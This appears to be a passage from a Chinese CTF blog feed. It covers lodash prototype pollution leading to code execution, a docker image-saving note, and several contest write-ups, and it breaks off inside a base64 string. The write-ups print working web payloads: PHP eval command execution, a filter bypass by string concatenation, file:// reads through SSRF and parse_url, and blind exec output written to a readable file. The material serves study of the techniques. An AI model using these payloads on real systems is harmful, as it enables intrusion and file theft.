o2)</span><br><span class="line">console.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line">console.log(o3.b)</span><br></pre></td></tr></table></figure><p>可见，新建的o3对象，也存在b属性，说明Object已经被污染：</p><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/5e05a46f-3c7b-4ab4-869c-fe6fd19422b7.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5e05a46f-3c7b-4ab4-869c-fe6fd19422b7.64db1b9bbae7.png" alt="image.png"></a></p><p>这是因为，JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。</p><p>merge操作是最常见可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题。</p><h2 id="0x05-Code-Breaking-2018-Thejs-分析"><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x05-code-breaking-2018-thejs">0x05 Code-Breaking 2018 Thejs 分析</a></h2><p>我在Code-Breaking 2018中出了一道原型链污染的CTF题目，为了更加贴合真实环境，我没有刻意加太多自己的代码，后端主要代码如下（完整代码可参考<a href="https://github.com/phith0n/code-breaking/blob/master/2018/thejs/web/server.js">这里</a>）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// ...</span><br><span class="line">const lodash = require(&#x27;lodash&#x27;)</span><br><span class="line">// ...</span><br><span class="line"></span><br><span class="line">app.engine(&#x27;ejs&#x27;, function (filePath, options, callback) &#123; </span><br><span class="line">// define the template engine</span><br><span class="line">    fs.readFile(filePath, (err, content) =&gt; &#123;</span><br><span class="line">        if (err) return callback(new Error(err))</span><br><span class="line">        let compiled = lodash.template(content)</span><br><span class="line">        let rendered = compiled(&#123;...options&#125;)</span><br><span class="line"></span><br><span class="line">        return callback(null, rendered)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">//...</span><br><span class="line"></span><br><span class="line">app.all(&#x27;/&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    let data = req.session.data || &#123;language: [], category: []&#125;</span><br><span class="line">    if (req.method == &#x27;POST&#x27;) &#123;</span><br><span class="line">        data = lodash.merge(data, req.body)</span><br><span class="line">        req.session.data = data</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.render(&#x27;index&#x27;, &#123;</span><br><span class="line">        language: data.language, </span><br><span class="line">        category: data.category</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>lodash是为了弥补JavaScript原生函数功能不足而提供的一个辅助功能集，其中包含字符串、数组、对象等操作。这个Web应用中，使用了lodash提供的两个工具：</p><ol><li><code>lodash.template</code> 一个简单的模板引擎</li><li><code>lodash.merge</code> 函数或对象的合并</li></ol><p>其实整个应用逻辑很简单，用户提交的信息，用merge方法合并到session里，多次提交，session里最终保存你提交的所有信息。</p><p>而这里的<code>lodash.merge</code>操作实际上就存在原型链污染漏洞。</p><p>在污染原型链后，我们相当于可以给Object对象插入任意属性，这个插入的属性反应在最后的<code>lodash.template</code>中。我们看到<code>lodash.template</code>的代码：<a href="https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165">https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// Use a sourceURL for easier debugging.</span><br><span class="line">var sourceURL = &#x27;sourceURL&#x27; in options ? &#x27;//# sourceURL=&#x27; + options.sourceURL + &#x27;\n&#x27; : &#x27;&#x27;;</span><br><span class="line">// ...</span><br><span class="line">var result = attempt(function() &#123;</span><br><span class="line">  return Function(importsKeys, sourceURL + &#x27;return &#x27; + source)</span><br><span class="line">  .apply(undefined, importsValues);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>options是一个对象，sourceURL取到了其<code>options.sourceURL</code>属性。这个属性原本是没有赋值的，默认取空字符串。</p><p>但因为原型链污染，我们可以给所有Object对象中都插入一个<code>sourceURL</code>属性。最后，这个<code>sourceURL</code>被拼接进<code>new Function</code>的第二个参数中，造成任意代码执行漏洞。</p><p>我将带有<code>__proto__</code>的Payload以json的形式发送给后端，因为express框架支持根据Content-Type来解析请求Body，这里给我们注入原型提供了很大方便：</p><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/85fae11e-100b-41aa-9316-de81b93d0036.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/85fae11e-100b-41aa-9316-de81b93d0036.c6d39683853f.png" alt="image.png"></a></p><p>可见，我们代码执行成功，返回了id命令的结果。</p><p>整个案例我觉得是一个非常经典的原型链污染漏洞教程，代码不多，逻辑不复杂，没有刻意创造漏洞，真正触发漏洞的代码在库中。</p><p>我一直觉得，出题不要刻意创造漏洞，而是找找你的知识点是否能在真实环境下找到应用。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker保存和打包镜像</title>
      <link href="/posts/5721bfe4.html"/>
      <url>/posts/5721bfe4.html</url>
      
        <content type="html"><![CDATA[<h2 id="docker保存和打包镜像">docker保存和打包镜像</h2><p>作用：在现在容器镜像上保存镜像进行打包，在另一台服务上使用；或现有的容器安装了一些库，配置了开发环境，需要保存下载，下次加载后直接使用。</p><h4 id="1-1-首先查看下现有容器镜像（目的是查询需要保存镜像的ID）">1.1 首先查看下现有容器镜像（目的是查询需要保存镜像的ID）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><h4 id="1-2-接下来用commit参数进行保存镜像（精简版）">1.2 接下来用commit参数进行保存镜像（精简版）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit  7ca736d99653    yolov5:v6.2</span><br></pre></td></tr></table></figure><p>其中，7ca736d99653 是需要保存镜像的ID，刚才用docker ps -a 查询到的。</p><h2 id="打包tar">打包tar</h2><p>使用save参数进行打包，格式如：docker save -o  tar文件名称     镜像REPOSITORY:TAG</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker save -o yolov5-v6.2.tar yolov5:v6.2</span><br></pre></td></tr></table></figure><p>其中yolov5:v6.2 是需要保存镜像的REPOSITORY、和TAG；也是上面保存的镜像名称。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第八届强网杯青少赛wp</title>
      <link href="/posts/2cd096fe.html"/>
      <url>/posts/2cd096fe.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="misc">misc</h2><h4 id="签到漫画">签到漫画</h4><blockquote><p>每个漫画的最后一张都是二维码的一部分，全部保存，然后拼在一起，扫描二维码出flag.。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124155544679.png" alt="image-20241124155544679"></p><blockquote><p>flag{youthful_and_upward}</p></blockquote><h4 id="whitepic">whitepic</h4><blockquote><p>考点：gif图像</p></blockquote><blockquote><p>下载文件，没有后缀名，能用010editor打开</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124155848111.png" alt="image-20241124155848111"></p><blockquote><p>根据文件头GIF89a，可以看出是个gif文件。直接使用gifsplitter分离帧数，在其中一帧找到flag</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124160011013.png" alt="image-20241124160011013"></p><h4 id="问卷">问卷</h4><blockquote><p>你懂的</p></blockquote><h2 id="web">web</h2><h4 id="ezGetFlag">ezGetFlag</h4><blockquote><p>考点：http请求方式</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124160230507.png" alt=""></p><blockquote><p>点击10次会出现提示</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124160307890.png" alt="image-20241124160307890"></p><blockquote><p>直接抓包，修改请求方式，把GET改成POST就行了。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124160446998.png" alt="image-20241124160446998"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124160500182.png" alt="image-20241124160500182"></p><blockquote><p>flag{4efb5300-7885-40a9-bf2a-31bbd8ebef86}</p></blockquote><h4 id="ezFindShell">ezFindShell</h4><blockquote><p>考点：代码审计</p></blockquote><p>这题是赛后复现，所以可能不全</p><p>首先拿到一堆php文件，用seay审计</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130223303421.png" alt="image-20241130223303421"></p><p>非常相似，当时比赛没找到漏洞，现在复现，全局搜索一下post</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130223557289.png" alt="image-20241130223557289"></p><p>发现可用漏洞</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130223624296.png" alt="image-20241130223624296"></p><p>array_filter() 函数用回调函数过滤数组中的元素。</p><p>该函数把输入数组中的每个键值传给回调函数。如果回调函数返回 true，则把输入数组中的当前键值返回给结果数组。数组键名保持不变。</p><p>将代码进行base64编码传上去应该就可利用该漏洞。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hubu新星杯实践能力赛模拟赛web-wp</title>
      <link href="/posts/98034dd5.html"/>
      <url>/posts/98034dd5.html</url>
      
        <content type="html"><![CDATA[<h4 id="ez-eval">ez_eval</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$hubu = $_GET[&#x27;hubu&#x27;];</span><br><span class="line"></span><br><span class="line">eval($hubu);</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><blockquote><p>先进行代码审计，GET传参hubu，并执行命令，没有任何绕过，放开手脚去做</p><p>payload:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?hubu=system(&#x27;cat /f*&#x27;);      #直接rce</span><br></pre></td></tr></table></figure><h4 id="rce-level1">rce_level1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c  = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p>代码审计，发现过滤了关键字flag,system,php。</p><p>使用拼接绕过构造payload:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=(&#x27;sys&#x27;.&#x27;tem&#x27;)(ls);    #发现目录下没有flag文件</span><br><span class="line">?c=(&#x27;sys&#x27;.&#x27;tem&#x27;)(cat /f*);   #发现回显空白</span><br></pre></td></tr></table></figure><blockquote><p>不在文件夹里，那可能是在phpinfo里</p></blockquote><blockquote><p>payload：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=phpinfo();</span><br></pre></td></tr></table></figure><blockquote><p>没回显…根据代码的过滤可以知道，应该只过滤了三个关键字，可其实并不只过滤了这三个关键字。</p><p>经过测试，发现有隐藏过滤，比如关键字php，和一些字符如反斜杠\</p><p>最后的payload:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=(&#x27;ph&#x27;.&#x27;pinfo&#x27;)();</span><br></pre></td></tr></table></figure><blockquote><p>在页面中找到flag。</p></blockquote><h4 id="ez-LFI">ez_LFI</h4><blockquote><p>考点：伪协议</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124161059701.png" alt="image-20241124161059701"></p><blockquote><p>先随便传一个，/?url=111</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124161148073.png" alt="image-20241124161148073"></p><blockquote><p>代码审计，根据网上查询的parse_url()函数的资料显示：</p><p>解析 URL，返回其组成部分，如下：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url = &#x27;http://username:password@hostname/path?arg=value#anchor&#x27;;</span><br><span class="line">print_r(parse_url($url));</span><br><span class="line">echo parse_url($url, PHP_URL_PATH);</span><br><span class="line">?&gt;</span><br><span class="line">结果----------------------------------------------------------------------------------------------------</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; hostname</span><br><span class="line">    [user] =&gt; username</span><br><span class="line">    [pass] =&gt; password</span><br><span class="line">    [path] =&gt; /path</span><br><span class="line">    [query] =&gt; arg=value</span><br><span class="line">    [fragment] =&gt; anchor</span><br><span class="line">)</span><br></pre></td></tr></table></figure><blockquote><p>所以必须在传入的url参数中让[host]是localhost。</p><p>然后再用file协议读取flag。</p><p>payload:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=file://localhost/flag</span><br></pre></td></tr></table></figure><blockquote><p>HUBUCTF{22290581-9558-4405-9c01-368dc660bf6a}</p></blockquote><h2 id="Misc">Misc</h2><h4 id="Cute-Rabbit">Cute Rabbit</h4><blockquote><p>考点：rabbit编码</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VTJGc2RHVmtYMS91RnhkczF5SU1jdit1K3o0NzFCcDR2aXcrVkNNaS9TU1QyZU5EMFUvSQo=</span><br></pre></td></tr></table></figure><blockquote><p>签到题，根据题目提示，是rabbit编码，密文末尾的=表示可能是base64，所以是</p><p>base64 -&gt; rabbit</p><p>HUBUCTF{S0_&lt;u73_R4b6it}</p></blockquote><h4 id="Docker-Forensic">Docker Forensic</h4><blockquote><p>考点：docker的使用</p></blockquote><blockquote><p>根据题目提示，先拉取镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull crpi-i24jskxbbxvfxlzp.cn-hangzhou.personal.cr.aliyuncs.com/st4rry/aliyun:ez_docker_forensic</span><br></pre></td></tr></table></figure></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124162645328.png" alt="image-20241124162645328"></p><blockquote><p>将镜像压缩到本地</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124164537663.png" alt="image-20241124164537663"></p><blockquote><p>将文件解压到一个目录下，然后切换到该目录。在该目录下有个sha256文件夹，把里面的文件解压</p><p>在tmp中找到password</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124165519193.png" alt="image-20241124165519193"></p><blockquote><p>退级，在解压后的一个文件夹里找到flag.txt</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124165719701.png" alt="image-20241124165719701"></p><blockquote><p>使用了加盐算法，密钥就是上面的password,进行解密</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124171222266.png" alt="image-20241124171222266"></p><blockquote><p>HUBUCTF{1_L0v3_D0ck3r_F0r3ns1c_A}</p></blockquote><h4 id="SpeedMath">SpeedMath</h4><blockquote><p>考点：nc连接，python脚本</p></blockquote><blockquote><p>先用nc连接</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124171410644.png" alt="image-20241124171410644"></p><blockquote><p>发现会出现算数题目，但是给你输入的时间很短，所以几乎不可能手工做，直接问AI写脚本</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def solve_arithmetic_expression(expression):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    解析并计算算术表达式的结果。</span><br><span class="line">    这里假设表达式只包含整数和基本的加减乘除运算。</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        # 使用eval计算表达式的结果，但注意eval的安全性问题</span><br><span class="line">        # 在实际应用中，应该使用更安全的解析方法</span><br><span class="line">        result = eval(expression)</span><br><span class="line">        return result</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;Error evaluating expression &#x27;&#123;expression&#125;&#x27;: &#123;e&#125;&quot;)</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line">def nc_connection(host, port):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    使用Netcat连接到服务器，并自动解答算术题。</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:</span><br><span class="line">        s.connect((host, port))</span><br><span class="line">        </span><br><span class="line">        while True:</span><br><span class="line">            # 读取服务器发送的数据</span><br><span class="line">            data = s.recv(1024).decode(&#x27;utf-8&#x27;).strip()</span><br><span class="line">            </span><br><span class="line">            if not data:</span><br><span class="line">                # 如果没有接收到数据，可能是连接已经关闭</span><br><span class="line">                break</span><br><span class="line">            </span><br><span class="line">            print(f&quot;Received: &#123;data&#125;&quot;)</span><br><span class="line">            </span><br><span class="line">            # 使用正则表达式匹配算术题目</span><br><span class="line">            match = re.match(r&#x27;Question \d+: (\d+) ([+\-*/]) (\d+) =&#x27;, data)</span><br><span class="line">            if match:</span><br><span class="line">                num1 = int(match.group(1))</span><br><span class="line">                operator = match.group(2)</span><br><span class="line">                num2 = int(match.group(3))</span><br><span class="line">                </span><br><span class="line">                # 构造算术表达式</span><br><span class="line">                expression = f&quot;&#123;num1&#125; &#123;operator&#125; &#123;num2&#125;&quot;</span><br><span class="line">                </span><br><span class="line">                # 计算正确答案</span><br><span class="line">                correct_answer = solve_arithmetic_expression(expression)</span><br><span class="line">                </span><br><span class="line">                if correct_answer is not None:</span><br><span class="line">                    # 将答案发送回服务器（假设服务器期望的是整数答案）</span><br><span class="line">                    s.sendall(f&quot;&#123;correct_answer&#125;\n&quot;.encode(&#x27;utf-8&#x27;))</span><br><span class="line">                else:</span><br><span class="line">                    # 如果无法计算表达式，则退出循环</span><br><span class="line">                    print(&quot;Failed to solve expression.&quot;)</span><br><span class="line">                    break</span><br><span class="line">            else:</span><br><span class="line">                # 如果不是算术题目，可能是其他信息或结束信息</span><br><span class="line">                # 这里假设服务器在发送完所有题目后会发送一个非算术题目的消息</span><br><span class="line">                print(&quot;Received non-arithmetic message, possibly final message.&quot;)</span><br><span class="line">                print(f&quot;Final message: &#123;data&#125;&quot;)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line"># 使用示例</span><br><span class="line">nc_connection(&#x27;challenge.hubuctf.cn&#x27;, 32478)  # 替换为你的服务器主机名和端口号</span><br></pre></td></tr></table></figure><blockquote><p>HUBUCTF{72e53365-bf9c-48db-8327-83b9c9269e7d}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>华科第一届网络安全挑战赛wp</title>
      <link href="/posts/4971d2f4.html"/>
      <url>/posts/4971d2f4.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="web">web</h2><h4 id="secure-shell">secure_shell</h4><blockquote><p>考点：exec()无回显</p></blockquote><blockquote><p>对于这类题有个很简单的方法，直接将flag写进文件，然后路径读取就行</p></blockquote><blockquote><p>先测试一下能不能执行 cmd=1;sleep 4</p><p>发现反应了4秒，能执行</p><p>然后直接 cat /f* &gt; 1.txt</p><p>最后访问/1.txt路径就行</p></blockquote><h4 id="pyssrf">pyssrf</h4><blockquote><p>考点：ssrf漏洞</p></blockquote><blockquote><p>打开有个提示 /get?site=</p><p>直接file读取flag</p><p>/get?site=file:///flag</p><p>碎碎念：以为很难。。。试了半天。。。。</p></blockquote><h2 id="misc">misc</h2><h4 id="一闪一闪亮晶晶">一闪一闪亮晶晶</h4><blockquote><p>考点：凯撒与base64结合，starry语言</p></blockquote><blockquote><p>根据提示，“凯撒大帝想学习一下Starry语言，你能帮帮他么吗”，一定跟凯撒密码和starry语言有关。</p><p>下载文件，是一串重复度非常高的字符串</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JDBhJDBsJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhLxprJDBhJDBhJDBsJDBrJDBhJDBsLjBsJDBhMjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzprJDthMjBhJDBhLzBhJDBhJDBhDjthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDtLLjBsJDBhJDBvJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthJDphJDBhJBphLzphJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphDjBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBLJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJD4hJDBhJDBhMjBsJD4hJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjphLzBhJDBhJDBvJBphJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhDjBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBLJDphJDBhJDtrJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJBphJDBhJDtrJDBhMjBhJD4hLzBhJDBhMjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhDjBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDtrJDBhJDBhJDBLLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLhphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJD4hJDBhJD4hLzBhJDBhJDBvJDBhJDBsJDBhJDBhJDBsJDBrDjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphLzBhJDBhJDBvJDBhJDBsJDBhJDBhJDBLLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLhphLzBhJD4hJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhDjBsLjBsJDBhJDBhJD4hJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthJDpLJDBhJDBhJDtrLjBsJDBhJDBvJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJBphJDthJDphJDBhJDBsLjBsJDBhMjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhDjBhJDBhLzBhLjBhJDBhJDtrJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDtrJDBhJDBhJDBLLzBhLjBhJDBhLzphJDBhJD4hLzBhJDBhMjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLhphJDBhJDBhJDthJDphJDBhJDtrJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhDjBhJDBsJDBrJDBhJDBsLjBhJDBhLzBhJDBhJDBhLzBhLjB